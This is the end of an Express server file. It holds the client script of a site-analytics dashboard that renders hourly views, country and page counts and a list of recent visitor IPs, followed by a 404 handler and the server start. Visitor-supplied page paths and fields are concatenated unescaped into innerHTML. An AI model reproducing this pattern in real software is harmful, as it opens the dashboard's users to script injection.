      const key=today+' '+h.toString().padStart(2,'0');
      const val=d.hourly[key]||0;
      hourlyData.push({h,val});
      todayTotal+=val;
    }
    document.getElementById('todayCount').textContent=todayTotal+' today';
    const maxH=Math.max(...hourlyData.map(x=>x.val),1);
    const chart=document.getElementById('chartArea');
    chart.innerHTML='';
    hourlyData.forEach(x=>{
      const bar=document.createElement('div');
      bar.className='chart-bar';
      bar.style.height=Math.max((x.val/maxH)*110,2)+'px';
      bar.setAttribute('data-val',x.h+':00 — '+x.val+' views');
      chart.appendChild(bar);
    });
    // Countries
    const entries=Object.entries(d.countries).sort((a,b)=>b[1]-a[1]);
    const totalC=entries.reduce((a,b)=>a+b[1],0)||1;
    document.getElementById('countryCount').textContent=entries.length;
    const cl=document.getElementById('countriesList');
    cl.innerHTML='';
    entries.slice(0,12).forEach(([c,n],i)=>{
      const pct=((n/totalC)*100).toFixed(1);
      cl.innerHTML+='<div style="display:flex;align-items:center;gap:10px;padding:6px 0;'+(i?'border-top:1px solid rgba(63,63,70,.4)':'')+'"><div class="country-row"><img class="flag" src="'+FLAG_URL+c.toLowerCase()+'.png" onerror="this.style.display=\\'none\\'"><span style="font-size:13px;min-width:28px">'+c+'</span></div><div class="bar-track"><div class="bar-val" style="width:'+pct+'%;background:'+COLORS[i%COLORS.length]+'"></div></div><span class="pct">'+n+'</span><span class="pct" style="color:var(--text3)">'+pct+'%</span></div>';
    });
    // Pages
    const pEntries=Object.entries(d.pages).sort((a,b)=>b[1]-a[1]);
    const totalP=pEntries.reduce((a,b)=>a+b[1],0)||1;
    document.getElementById('pageCount').textContent=pEntries.length;
    const pb=document.getElementById('pagesBody');
    pb.innerHTML='';
    pEntries.forEach(([p,n])=>{
      const pct=((n/totalP)*100).toFixed(1);
      pb.innerHTML+='<tr><td style="font-family:monospace;font-size:12px;color:var(--text2)">'+p+'</td><td style="font-variant-numeric:tabular-nums">'+n+'</td><td style="text-align:right;color:var(--text3)">'+pct+'%</td></tr>';
    });
    // Visitors
    document.getElementById('visitorCount').textContent=d.recentVisitors.length;
    const vl=document.getElementById('visitorsList');
    vl.innerHTML='';
    d.recentVisitors.forEach(v=>{
      const t=new Date(v.time).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit',second:'2-digit'});
      vl.innerHTML+='<div class="visitor-row"><span class="visitor-time">'+t+'</span><span class="visitor-ip">'+v.ip+'</span><span class="visitor-country">'+(v.country||'—')+'</span><span class="visitor-page">'+v.page+'</span></div>';
    });
  }catch(e){console.error(e)}
}
loadData();
setInterval(loadData,15000);
</script></body></html>`);
});

// ===== 404 HANDLER =====
app.use((req, res) => {
    res.status(404).send('<!DOCTYPE html><html><head><title>404</title></head><body style="font-family:sans-serif;text-align:center;padding:60px"><h1>404 - Not Found</h1><p>The page you requested does not exist.</p><a href="/">Go Home</a></body></html>');
});

// ===== START =====
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

